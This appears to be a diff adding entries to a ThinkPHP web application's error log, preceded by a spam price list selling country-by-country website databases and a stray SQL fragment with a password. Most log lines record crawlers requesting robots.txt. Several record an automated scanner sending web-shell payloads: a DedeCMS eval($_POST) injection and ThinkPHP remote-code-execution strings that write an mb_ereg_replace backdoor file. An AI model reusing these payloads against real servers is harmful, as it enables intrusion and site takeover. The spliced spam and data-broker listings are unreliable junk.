+.ug 3806 websites Uganda - $30 
+.ug 720 websites International zone Uganda:.com .net .biz .info .name .tel .mobi.asia-$30 
+.uk 5975887 websites United Kingdom - $250 
+.uk 3304606 websites International zone United Kingdom:.com .net .biz .info .name .tel .mobi .asia-$150 
+.us 4828526 websites USA - $300 
+.us 1211424 websites International zone USA:.com .net .biz .info .name .tel .mobi .asia - $100 
+.uy 15571 websites Uruguay - $50 
+.uy 31812 websites International zone Uruguay:.com .net .biz .info .name .tel .mobi .asia-$30 
+.uz 65125 websites Uzbekistan - $50 
+.uz  365 websites International zone Uzbekistan:.com .net .biz .info .name .tel .mobi .asia 
+.vc 18641 websites Saint Vincent &amp; Grenadines - $50 
+.ve 14015 websites Venezuela - $50 
+.ve 2898 websites International zone Venezuela:.com .net .biz .info .name .tel .mobi .asia - $30 
+.vg 8389 websites Virgin Islands (British) - $50 
+.vi 109 websites Virgin Islands (US) - $30 
+.vn 436005 websites Vietnam - $80 
+.vn 161855 websites International zone Vietnam:.com .net .biz .info .name .tel .mobi .asia - $50 
+.vu 1051 websites Vanuatu - $30 
+.wf 1133 websites Wallis &amp; Futuna Islands - $30 
+.ws 99308 websites Samoa - $80 
+.ye 18 websites Yemen - $30 
+.yt 2004 websites Mayotte - $30 
+.za 1008308 websites South Africa - $100 
+ 
+website =» xn----7sbb1bbndheurc1a.xn--p1ai','contactimcoen','123456789','??','1633211306')
+
+[ 2021-10-03T09:17:50+08:00 ] 101.132.102.45 /index/login/login/token
+ERR: 非法操作:login
+
+[ 2021-10-03T09:40:14+08:00 ] 3.101.127.41 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T09:40:15+08:00 ] 13.57.248.12 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T09:40:16+08:00 ] 18.144.54.104 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T09:40:16+08:00 ] 13.57.186.51 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T09:40:16+08:00 ] 13.57.231.122 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T09:40:16+08:00 ] 54.219.10.128 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T09:40:16+08:00 ] 13.57.194.102 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T09:40:16+08:00 ] 54.176.167.124 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T09:40:16+08:00 ] 54.67.115.65 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T09:40:16+08:00 ] 54.177.90.95 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T09:40:16+08:00 ] 54.215.213.104 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T09:40:16+08:00 ] 54.183.215.86 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T09:40:16+08:00 ] 13.56.179.32 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T09:40:16+08:00 ] 54.176.43.201 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /plus/moon.php
+ERR: 无法加载控制器:Plus
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /plus/90sec.php
+ERR: 无法加载控制器:Plus
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /utility/convert/index.php?a=config&source=d7.2_x2.0
+ERR: 无法加载控制器:Utility
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /utility/convert/data/config.inc.php
+ERR: 无法加载控制器:Utility
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();//
+ERR: 无法加载控制器:Uploads
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /uploads/dede/sys_verifies.php?action=down
+ERR: 无法加载控制器:Uploads
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /user.php?act=login
+ERR: 无法加载控制器:User
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /fdgq.php
+ERR: 无法加载控制器:Fdgq
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=osjjf.php&content=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E
+ERR: 非法操作:\think\template\driver\file
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /osjjf.php
+ERR: 无法加载控制器:Osjjf
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /user.php?act=login
+ERR: 无法加载控制器:User
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /ysyqq.php
+ERR: 无法加载控制器:Ysyqq
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=kjmzz.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E$
+ERR: 非法操作:\think\app
+
+[ 2021-10-03T10:14:08+08:00 ] 123.129.217.177 /kjmzz.php
+ERR: 无法加载控制器:Kjmzz
+
+[ 2021-10-03T14:24:37+08:00 ] 157.55.39.19 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T14:55:17+08:00 ] 203.208.60.47 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T14:55:37+08:00 ] 51.222.253.13 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T14:59:37+08:00 ] 185.191.171.22 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T17:58:18+08:00 ] 157.55.39.19 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T19:26:38+08:00 ] 51.222.253.19 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T22:37:22+08:00 ] 176.123.0.55 /wp-login.php
+ERR: 无法加载控制器:Wp-login
+
